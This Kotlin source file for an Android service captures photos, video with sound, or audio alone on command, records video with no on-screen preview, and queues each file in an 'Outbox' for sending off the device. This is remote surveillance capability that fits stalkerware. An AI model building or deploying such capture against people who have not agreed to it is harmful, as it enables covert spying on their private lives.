package com.vlink.consent

import android.annotation.SuppressLint
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.ImageFormat
import android.graphics.SurfaceTexture
import android.hardware.camera2.*
import android.media.ImageReader
import android.media.MediaRecorder
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.view.Surface
import org.json.JSONObject
import java.io.File

class CaptureService : Service() {
    companion object {
        const val A_PHOTO = "photo"
        const val A_VIDEO = "video"
        const val A_AUDIO = "audio"

        fun run(c: Context, action: String, seconds: Int = 10, front: Boolean = false) {
            val i = Intent(c, CaptureService::class.java)
                .putExtra("a", action).putExtra("sec", seconds).putExtra("front", front)
            androidx.core.content.ContextCompat.startForegroundService(c, i)
        }
    }

    private lateinit var thread: HandlerThread
    private lateinit var h: Handler
    private var camera: CameraDevice? = null
    private var session: CameraCaptureSession? = null
    private var tex: SurfaceTexture? = null
    private var dummy: Surface? = null
    private var rec: MediaRecorder? = null
    private var out: File? = null

    override fun onBind(i: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        EventLog.channel(this)
        startForeground(3102, Fg.build(this, "ضبط", "در حال اجرا"))
        thread = HandlerThread("cam").also { it.start() }
        h = Handler(thread.looper)
    }

    override fun onStartCommand(i: Intent?, f: Int, s: Int): Int {
        when (i?.getStringExtra("a")) {
            A_PHOTO -> photo(i.getBooleanExtra("front", false))
            A_VIDEO -> video(i.getIntExtra("sec", 10), i.getBooleanExtra("front", false))
            A_AUDIO -> audio(i.getIntExtra("sec", 15))
            else -> stopSelf()
        }
        return START_NOT_STICKY
    }

    @SuppressLint("MissingPermission")
    private fun id(front: Boolean): String? {
        val cm = getSystemService(CameraManager::class.java)
        val want = if (front) CameraCharacteristics.LENS_FACING_FRONT else CameraCharacteristics.LENS_FACING_BACK
        return cm.cameraIdList.firstOrNull {
            cm.getCameraCharacteristics(it).get(CameraCharacteristics.LENS_FACING) == want
        } ?: cm.cameraIdList.firstOrNull()
    }

    @SuppressLint("MissingPermission")
    private fun photo(front: Boolean) {
        val cm = getSystemService(CameraManager::class.java)
        val camId = id(front) ?: return stopSelf()
        val f = File(cacheDir, "p_" + System.currentTimeMillis() + ".jpg")
        val reader = ImageReader.newInstance(1920, 1080, ImageFormat.JPEG, 1)
        reader.setOnImageAvailableListener({ r ->
            val img = r.acquireLatestImage() ?: return@setOnImageAvailableListener
            val buf = img.planes[0].buffer
            val bytes = ByteArray(buf.remaining()).also { buf.get(it) }
            img.close(); r.close()
            f.writeBytes(bytes)
            EventLog.add(this, "photo", JSONObject().put("name", f.name))
            Outbox(this).put("photo", JSONObject(), f, "image/jpeg")
            stopSelf()
        }, h)

        cm.openCamera(camId, object : CameraDevice.StateCallback() {
            override fun onOpened(c: CameraDevice) {
                camera = c
                c.createCaptureSession(listOf(reader.surface), object : CameraCaptureSession.StateCallback() {
                    override fun onConfigured(s: CameraCaptureSession) {
                        session = s
                        val b = c.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                        b.addTarget(reader.surface)
                        s.capture(b.build(), null, h)
                    }
                    override fun onConfigureFailed(s: CameraCaptureSession) { stopSelf() }
                }, h)
            }
            override fun onDisconnected(c: CameraDevice) {}
            override fun onError(c: CameraDevice, e: Int) { stopSelf() }
        }, h)
    }

    @SuppressLint("MissingPermission")
    private fun video(seconds: Int, front: Boolean) {
        val cm = getSystemService(CameraManager::class.java)
        val camId = id(front) ?: return audio(seconds)
        val f = File(cacheDir, "v_" + System.currentTimeMillis() + ".mp4")
        out = f
        val st = SurfaceTexture(0)
        tex = st
        dummy = Surface(st)
        st.setOnFrameAvailableListener { runCatching { st.updateTexImage() } }

        val r = if (Build.VERSION.SDK_INT >= 31) MediaRecorder(this) else @Suppress("DEPRECATION") MediaRecorder()
        rec = r
        r.setVideoSource(MediaRecorder.VideoSource.SURFACE)
        r.setAudioSource(MediaRecorder.AudioSource.MIC)
        r.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
        r.setVideoEncoder(MediaRecorder.VideoEncoder.H264)
        r.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
        r.setVideoSize(1280, 720)
        r.setVideoFrameRate(30)
        r.setVideoEncodingBitRate(4_000_000)
        r.setOutputFile(f.absolutePath)
        r.prepare()

        cm.openCamera(camId, object : CameraDevice.StateCallback() {
            override fun onOpened(c: CameraDevice) {
                camera = c
                val targets = listOfNotNull(dummy, r.surface)
                c.createCaptureSession(targets, object : CameraCaptureSession.StateCallback() {
                    override fun onConfigured(s: CameraCaptureSession) {
                        session = s
                        val b = c.createCaptureRequest(CameraDevice.TEMPLATE_RECORD)
                        targets.forEach { b.addTarget(it) }
                        runCatching { s.setRepeatingRequest(b.build(), null, h); r.start() }
                            .onFailure { endVideo(true) }
                        h.postDelayed({ endVideo(false) }, seconds * 1000L)
                    }
                    override fun onConfigureFailed(s: CameraCaptureSession) { endVideo(true) }
                }, h)
            }
            override fun onDisconnected(c: CameraDevice) {}
            override fun onError(c: CameraDevice, e: Int) { endVideo(true) }
        }, h)
    }

    private fun endVideo(failed: Boolean) {
        runCatching { rec?.stop() }
        runCatching { rec?.release() }
        rec = null
        runCatching { session?.close() }
        runCatching { camera?.close() }
        val f = out
        if (!failed && f != null && f.length() > 1024) {
            EventLog.add(this, "video", JSONObject().put("name", f.name))
            Outbox(this).put("video", JSONObject(), f, "video/mp4")
        }
        stopSelf()
    }

    private fun audio(seconds: Int) {
        val f = File(cacheDir, "a_" + System.currentTimeMillis() + ".m4a")
        val r = if (Build.VERSION.SDK_INT >= 31) MediaRecorder(this) else @Suppress("DEPRECATION") MediaRecorder()
        rec = r
        r.setAudioSource(MediaRecorder.AudioSource.MIC)
        r.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
        r.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
        r.setAudioEncodingBitRate(96_000)
        r.setAudioSamplingRate(44_100)
        r.setOutputFile(f.absolutePath)
        r.prepare()
        r.start()
        h.postDelayed({
            runCatching { r.stop() }
            runCatching { r.release() }
            rec = null
            EventLog.add(this, "audio", JSONObject().put("name", f.name))
            Outbox(this).put("audio", JSONObject(), f, "audio/mp4")
            stopSelf()
        }, seconds * 1000L)
    }

    override fun onDestroy() {
        runCatching { session?.close(); camera?.close(); tex?.release(); dummy?.release() }
        thread.quitSafely()
        super.onDestroy()
    }
}
